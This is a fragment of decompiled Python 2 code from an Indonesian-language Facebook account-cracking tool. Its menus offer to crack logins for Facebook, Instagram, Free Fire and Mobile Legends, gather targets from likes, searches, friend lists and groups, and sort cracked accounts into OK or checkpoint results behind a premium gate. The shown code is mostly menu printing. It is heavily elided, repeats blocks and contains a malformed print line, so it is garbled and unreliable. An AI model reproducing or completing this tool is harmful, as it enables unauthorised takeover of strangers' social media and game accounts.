...
# Compiled at: 2021-11-15 17:28:23
d = '\x1b[90;1m'
m = '\x1b[91;1m'
h = '\x1b[92;1m'
k = '\x1b[93;1m'
...
def __pilih_crack__():
    try:
        print garis
        print h + ' [' + k + '1' + h + ']' + p + ' Crack' + p + ' Login Instagram Lewat Facebook'
        print h + ' [' + k + '2' + h + ']' + p + ' Crack' + p + ' Login Free Fire' + p + '(' + k + 'FF' + p + ')' + a + ' Lewat FB'
        print h + ' [' + k + '3' + h + ']' + p + ' Crack' + p + ' Login Mobile Legend' + p + '(' + k + 'MLBB' + p + ')' + a + ' Lewat FB'
        print h + ' [' + p + '4' + h + ']' + k + ' Crack API facebook' + a + '(' + p + 'fast Cracking' + a + ')' + h + '>> Super Pro'
        print h + ' [' + k + '5' + h + ']' + p + ' Crack' + p + ' Login Lewat facebook Mobile'
        ...
        print ''
        if pilih == '1':
            instagram.append('Masayiye')
            crack()
        elif pilih == '2':
            instagram.append('Masayiye')
            log_ff_dev.append('Masayiye')
            crack()
        elif pilih == '3':
            instagram.append('Masayiye')
            log_ml_dev.append('Masayiye')
            crack()
        elif pilih == '4':
            b_api.append('Masayiye')
            crack()
        elif pilih == '5':
            mobile_crack.append('Masayiye')
            crack()
        elif pilih == '6':
            log_mbasic_dev.append('Masayiyr')
            mobile_crack.append('Masayiye')
            crack()
        elif pilih == '7':
            log_free_dev.append('Masayiyr')
            mobile_crack.append('Masayiye')
            crack()
        else:
            __pilih_crack__()
    ...
    try:
        ...
        try:
            if user_agent_ == cokiez:
                print h + ' [' + p + '6' + h + ']' + p + ' Crack Dari Pencarian' + p + '(' + h + 'No login' + p + ')' + a + '[' + p + 'Premium!' + a + ']'
                print h + ' [' + p + '7' + h + ']' + p + ' Cek Hasil Crack Checkpoint'
                print h + ' [' + p + '8' + h + ']' + p + ' Ganti Tumbal Hasil Crack Live'
            else:
        ...
        with requests.Session() as (ses_):
                ...
                if user_agent_ == cokiez:
                    ...
                    if '|' in user_agentzz_:
                        ...
                        if ':' in str(lim_dev) or '-' in str(lim_dev):
                            ...
                            exit()
                        if int(lim_dev) > 24:
                            print h + ' [' + k + '*' + h + ']' + p + ' Waktu: ' + h + '1Tahun'
                        else:
                            print h + ' [' + k + '*' + h + ']' + p + ' Waktu: ' + h + lim_dev + p + ' 1Tahun lagi'
                else:
                    print h + ' [' + k + '*' + h + ']' + p + ' Status:' + h + ' PREMIUM*'
            except NameError:
                print h + ' [' + k + '*' + h + ']' + p + ' Status:' + h + ' PREMIUM*'
            ...
            try:
                if user_agent_ == cokiez:
                    ...
                    print h + ' [' + k + '6' + h + ']' + k + ' Crack from People Search' + p + '(' + p + 'PRO' + p + ')'
                    print h + ' [' + k + '7' + h + ']' + p + ' Crack ' + k + 'friends list from people search'
                    ...
                    print h + ' [' + k + '15' + h + ']' + p + ' Ganti Tumbal Hasil Crack Live'
                    ...
                    print h + ' [' + k + '4' + h + ']' + p + ' Crack from Likes'
                    print h + ' [' + k + '5' + h + ']' + p + ' Crack from People Search'
                    print h + ' [' + k + '6' + h + ']' + p + ' Crack from People Search' + p + '(' + p + 'PRO' + p + ')'
                    print h + ' [' + k + '7' + h + ']' + p + ' Crack friends list from people search'
                    print h + ' [' + k + '8' + h + ']' + p + ' Crack from My Groups' + k + '/Massal'
                    print h + ' [' + k + '9' + h + ']' + p + ' Cek hasil Crack' + h + ' OK' + p + '/' + k + 'CP'
                    print h + ' [' + k + '10' + h + ']' + p + ' Log Out Facebook'
                    print h + ' [' + k + '11' + h + ']' + p + ' Update Tool'
                ...
                print h + ' [' + k + '4' + h + ']' + p + ' Crack from Likes'
                print h + ' [' + k + '5' + h + ']' + p + ' Crack from People Search'
                print h + ' [' + k + '6' + h + ']' + p + ' Crack from People Search' + p + '( + p + 'PRO' + ')'
                print h + ' [' + k + '7' + h + ']' + p + ' Crack friends list from people search'
                print h + ' [' + k + '8' + h + ']' + p + ' Crack from My Groups' + k +  '/Massal'
                print h + ' [' + k + '9' + h + ']' + p + ' Cek hasil Crack' + h + ' OK' + p + '/' + k + 'CP'
                print h + ' [' + k + '10' + h + ']' + p + ' Log Out Facebook'
